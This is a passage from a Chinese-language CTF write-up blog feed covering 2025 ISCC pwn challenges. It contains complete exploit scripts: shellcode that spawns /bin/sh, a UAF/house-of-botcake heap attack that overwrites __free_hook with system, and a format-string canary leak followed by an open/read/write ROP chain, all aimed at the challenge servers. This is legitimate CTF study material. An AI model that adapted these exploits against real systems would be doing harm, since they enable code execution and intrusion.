class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">challenge = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;101.200.155.151:12800&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">1</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 自定义cmd</span></span><br><span class="line">cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    set follow-fork-mode parent\n</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line"><span class="comment"># bps = [0x1697, 0x016E3, 0x018EA]</span></span><br><span class="line">bps = [<span class="number">0x0156B</span>]</span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_cmd</span>(<span class="params">payload</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;xidp,ido&#x27;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_to_int_encoder</span>(<span class="params"><span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">bytes</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x68732f6e69622f = hs/nib/</span></span><br><span class="line">code_fragments = [</span><br><span class="line">    <span class="string">b&quot;\x34\x3b\x90\x90&quot;</span>,<span class="comment"># xor al,0x3b; nop; nop</span></span><br><span class="line">    <span class="string">b&quot;\x48\x31\xf6\x90&quot;</span>,<span class="comment"># xor rsi,rsi; nop;</span></span><br><span class="line">    <span class="string">b&quot;\x48\x31\xd2\x90&quot;</span>,<span class="comment"># xor rdi,rdi; nop;</span></span><br><span class="line">    <span class="string">b&quot;\x66\xbb\x73\x68&quot;</span>,<span class="comment">#mov bx,0x6873</span></span><br><span class="line">    <span class="string">b&quot;\x48\xc1\xe3\x10&quot;</span>,<span class="comment">#shl rbx,0x10</span></span><br><span class="line">    <span class="string">b&quot;\x66\xbb\x6e\x2f&quot;</span>,<span class="comment">#mov bx,0x2f6e</span></span><br><span class="line">    <span class="string">b&quot;\x48\xc1\xe3\x10&quot;</span>,<span class="comment">#shl rbx,0x10</span></span><br><span class="line">    <span class="string">b&quot;\x66\xbb\x62\x69&quot;</span>,<span class="comment">#mov bx,0x6962</span></span><br><span class="line">    <span class="string">b&quot;\x48\xc1\xe3\x08&quot;</span>,<span class="comment">#shl rbx,0x8 注意这里是shl 0x8 不是shl 0x10 所以下面需要重复一个\x62</span></span><br><span class="line">    <span class="string">b&quot;\x66\xbb\x2f\x62&quot;</span>,<span class="comment">#mov bx,0x622f</span></span><br><span class="line">    <span class="string">b&quot;\x53\x90\x90\x90&quot;</span>,<span class="comment">#push rbx</span></span><br><span class="line">    <span class="string">b&quot;\x89\xe7\x90\x90&quot;</span>,<span class="comment">#mov edi,esp</span></span><br><span class="line">    <span class="string">b&quot;\x0f\x05\x90\x90&quot;</span>,<span class="comment">#syscall</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> code_segment <span class="keyword">in</span> code_fragments:</span><br><span class="line">    send_cmd(payload = <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    send_cmd(payload = bytes_to_int_encoder(code_segment))  <span class="comment"># 输入payload</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg(1, bps, cmd)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结束输入开始运行</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;saki,stop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/13.png"></p><h3 id="program"><a href="#program" class="headerlink" title="program"></a>program</h3><p><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/14.png"></p><p>一个基础入门的堆题，所使用的版本为 <code>Ubuntu GLIBC 2.31-0ubuntu9.17</code><br><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/15.png"><br>程序同时存在 <code>UAF</code> 和 <code>堆溢出</code> 两个漏洞，但是由于libc版本不高，我做的时候发现了UAF就直接开始打了，只用了UAF就做出来了，没用用到堆溢出</p><p>大致思路就是攻击 <code>tcachebin</code> 使用了 <code>house of botcake</code> 的攻击手法，修改 <code>tcachebin</code> 的 <code>next指针</code> 为 <code>free_hook</code> ，修改 <code>free_hook</code> 为 <code>system_addr</code> 然后找一个 <code>chunk</code> 写入 <code>/bin/sh</code> 字符串，然后 <code>free</code> 这个 <code>chunk</code></p><p>完整exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">challenge = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/home/xidp/tools/glibc-all-in-one/libs/2.31-0ubuntu9.17_amd64/libc-2.31.so&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;101.200.155.151:12300&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">1</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 自定义cmd</span></span><br><span class="line">cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    set follow-fork-mode parent\n</span></span><br><span class="line"><span class="string">    x/30gx 0x4040C0\n</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">bps = []</span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line">menu = <span class="string">&quot;choice:\n&quot;</span>  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):  </span><br><span class="line">    sdla(menu, <span class="built_in">str</span>(<span class="number">1</span>))  </span><br><span class="line">    sdla(<span class="string">&quot;index:\n&quot;</span>, <span class="built_in">str</span>(idx))  </span><br><span class="line">    sdla(<span class="string">&quot;size:\n&quot;</span>, <span class="built_in">str</span>(size))  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):  </span><br><span class="line">    sdla(menu, <span class="built_in">str</span>(<span class="number">2</span>))  </span><br><span class="line">    sdla(<span class="string">&quot;index:\n&quot;</span>, <span class="built_in">str</span>(idx))  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, lenth, content</span>):  </span><br><span class="line">    sdla(menu, <span class="built_in">str</span>(<span class="number">3</span>))  </span><br><span class="line">    sdla(<span class="string">&quot;index:\n&quot;</span>, <span class="built_in">str</span>(idx))  </span><br><span class="line">    sdla(<span class="string">&quot;length:\n&quot;</span>, <span class="built_in">str</span>(lenth))  </span><br><span class="line">    sda(<span class="string">&quot;content:\n&quot;</span>, content)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):  </span><br><span class="line">    sdla(menu, <span class="built_in">str</span>(<span class="number">4</span>))  </span><br><span class="line">    sdla(<span class="string">&quot;index:\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">9</span>):</span><br><span class="line">    add(i, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x20</span>) <span class="comment"># 防止合并</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">9</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x30</span>)</span><br><span class="line">show(<span class="number">10</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1ECDF0</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leak(<span class="string">&quot;free_hook&quot;</span>, free_hook)</span><br><span class="line">leak(<span class="string">&quot;malloc_hook&quot;</span>, malloc_hook)</span><br><span class="line">leak(<span class="string">&quot;binsh&quot;</span>, binsh)</span><br><span class="line">leak(<span class="string">&quot;system&quot;</span>, system)</span><br><span class="line">  </span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x100</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x1d0</span>) <span class="comment"># 可以控制到chunk9的next指针</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*(<span class="number">2</span>*<span class="number">12</span>)</span><br><span class="line">payload += p64(<span class="number">0x110</span>) + p64(<span class="number">0x110</span>)</span><br><span class="line">payload += p64(free_hook)</span><br><span class="line">edit(<span class="number">12</span>, <span class="number">0x100</span>, payload)</span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>) <span class="comment"># 把binsh字符串写入到chunk2中</span></span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">14</span>, <span class="number">0x100</span>, p64(system)) <span class="comment"># chunk14的fd指向system</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># pwndbg(1, bps, cmd)</span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p>远程有点怪，我明明打的shell，但是远程直接就输出flag给我了<br><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/16.png"></p><h3 id="Dilemma"><a href="#Dilemma" class="headerlink" title="Dilemma"></a>Dilemma</h3><p><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/17.png"></p><p>程序开启了沙箱保护<br><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/18.png"></p><p>func_1函数中先 <code>格式化字符串</code> 后 <code>read溢出</code>，但read溢出量不够我们打ORW<br><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/19.png"></p><p>func_0函数中 先 <code>read溢出</code> 后 <code>格式化字符串</code> ， 这里格式化字符串不好利用，但是read溢出量足够大<br><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/20.png"></p><p>所以我的思路是先利用 func_1中的格式化字符串漏洞泄露canary和栈地址，并且利用其中的read溢出转移到func_0中<br>随后利用func_0中的read溢出构造puts泄露libc地址，然后再次返回func_0，构造ROP，打ORW</p><p>这里有人就要问了，诶，为什么第一次格式化字符串不直接泄露libc地址呢，而是需要在第二次中利用puts来泄露libc地址呢<br>理由很简单啊，下面是我本地调用<code>call printf</code>的时候栈内存的情况，我做的时候头都晕了，下面哪个可以用来泄露libc地址我一时间都想不起来，(那个__libc_start_call_main+128不行吗？也许是可以的，但是我不喜欢)，头一热我感觉构造个puts也不麻烦，然后我就这样做了，现在想起来我构造了那么一大段真是勤劳的小蜜蜂<br><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/21.png"></p><p>然后利用puts泄露了read地址，puts地址，printf地址，然后放到网站里面查找得到远程libc为<code>libc6_2.35-0ubuntu3.8_amd64.so</code><br>网址: <a href="https://libc.rip/">libc-database</a><br><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/22.jpg"></p><p>应该还有更方便的方法直接泄露libc_base，然后打ORW的那种，但是我已经不想去研究了</p><p>完整exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">challenge = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment"># libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc6_2.35-0ubuntu3.8_amd64.so&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;101.200.155.151:12500&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">1</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 自定义cmd</span></span><br><span class="line">cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    set follow-fork-mode parent\n</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">bps = [<span class="number">0x040129B</span>]</span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line">func1_addr = <span class="number">0x0401235</span></span><br><span class="line">func2_addr = <span class="number">0x04011A3</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x000000000040119a</span><span class="comment">#: pop rdi; ret;</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000401233</span><span class="comment">#: leave; ret;</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span><span class="comment">#: ret;</span></span><br><span class="line">bss_addr = <span class="number">0x0404080</span> + <span class="number">0x300</span></span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>] <span class="comment"># 0x7fc6afd5ae50</span></span><br><span class="line">printf_got = elf.got[<span class="string">&quot;printf&quot;</span>] <span class="comment"># 0x7fd87dcab6f0</span></span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>] <span class="comment"># 0x7f0d77c007d0</span></span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">sdla(<span class="string">&quot;where are you go?\n&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))  </span><br><span class="line"></span><br><span class="line"><span class="comment"># canary_offset = 15</span></span><br><span class="line"><span class="comment"># stack_addr = 9</span></span><br><span class="line"><span class="comment"># 0x7fffffffdf10 stack_addr</span></span><br><span class="line"></span><br><span class="line">pwndbg(<span class="number">0</span>, bps, cmd)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%15$p_%9$p&quot;</span></span><br><span class="line">sdla(<span class="string">&quot;Enter you password:\n&quot;</span>, payload)</span><br><span class="line">rcu(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;canary&quot;</span>)</span><br><span class="line">rcu(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;stack_addr&quot;</span>)</span><br><span class="line">flag_addr = stack_addr - <span class="number">32</span></span><br><span class="line">leak(<span class="string">&quot;flag_addr&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ret) <span class="comment"># 这里还需要栈对齐，因为下面func2里面有printf需要栈对齐，否则会卡住</span></span><br><span class="line">payload += p64(func2_addr)</span><br><span class="line">sdla(<span class="string">&quot;I will check your password:\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">40</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(func2_addr)</span><br><span class="line">sdla(<span class="string">&quot;We have a lot to talk about\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">rcu(<span class="string">&quot;To find life in the face of death&quot;</span>)</span><br><span class="line">rc(<span class="number">41</span>)</span><br><span class="line">puts_addr = uu64()</span><br><span class="line">leak(<span class="string">&quot;puts_addr&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">open_addr = libc_base + libc.symbols[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_addr = libc_base + libc.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_addr = libc_base + libc.symbols[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc6_2.35-0ubuntu3.8_amd64.so</span></span><br><span class="line"></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x0000000000141d5e</span><span class="comment">#: pop rsi; ret;</span></span><br><span class="line">pop_rdx_r_ret = libc_base + <span class="number">0x000000000011f2e7</span><span class="comment">#: pop rdx; pop r12; ret;</span></span><br><span class="line"></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">leak(<span class="string">&quot;open_addr&quot;</span>)</span><br><span class="line">leak(<span class="string">&quot;read_addr&quot;</span>)</span><br><span class="line">leak(<span class="string">&quot;write_addr&quot;</span>)</span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&quot;flag.txt&quot;</span> <span class="comment"># 这里远程的flag叫做flag.txt卡了我半天，ISCC你赢了</span></span><br><span class="line">payload = payload.ljust(<span class="number">40</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(flag_addr)</span><br><span class="line">payload += p64(pop_rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(open_addr)</span><br><span class="line">  </span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_ret)</span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_r_ret)</span><br><span class="line">payload += p64(<span class="number">0xff</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret)</span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(write_addr)</span><br><span class="line"></span><br><span class="line">put(<span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line">sdla(<span class="string">&quot;We have a lot to talk about\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><p><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/23.png"></p><h2 id="未解出"><a href="#未解出" class="headerlink" title="未解出"></a>未解出</h2><h3 id="easybee"><a href="#easybee" class="headerlink" title="easybee"></a>easybee</h3><p><img src="/../picture/2025ISCC%E7%BB%83%E6%AD%A6%E9%A2%98/24.png"><br>真是不会哈，最后咋900来解？水平还是太差了，还要继续努力，求个会内核的师傅带带。</p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025 ISCC 擂台赛Pwn-wp(含附件)</title>
      <link href="/2025/06/13/2025%20ISCC%20%E6%93%82%E5%8F%B0%E8%B5%9BPwn-wp(%E5%90%AB%E9%99%84%E4%BB%B6)/"/>
      <url>/2025/06/13/2025%20ISCC%20%E6%93%82%E5%8F%B0%E8%B5%9BPwn-wp(%E5%90%AB%E9%99%84%E4%BB%B6)/</url>
      
